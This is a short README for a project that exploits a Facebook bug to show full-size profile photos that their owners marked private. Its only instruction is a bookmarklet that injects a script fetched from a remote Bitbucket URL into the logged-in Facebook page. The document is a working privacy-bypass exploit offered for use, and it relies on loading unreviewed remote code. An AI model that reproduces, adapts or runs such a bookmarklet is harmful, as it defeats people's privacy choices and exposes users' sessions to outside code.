Facebook-Profile-Pic
====================

Code to exploit the facebook profile pic bug. Displays the full size profile photo of profiles which have profile photos marked as private.

Create a bookmarket in the browser with the following code :     

    javascript:(function(){var t=document.createElement("script");t.setAttribute("type","text/javascript");t.setAttribute("src","https://bitbucket.org/warunsl/facebook-profile-pic/raw/752b37b7c55908475539c3e62d66af8a39011aea/FbShowProfilePic.js");document.body.appendChild(t)})()

Works with Mozilla, not tested with Chrome. 
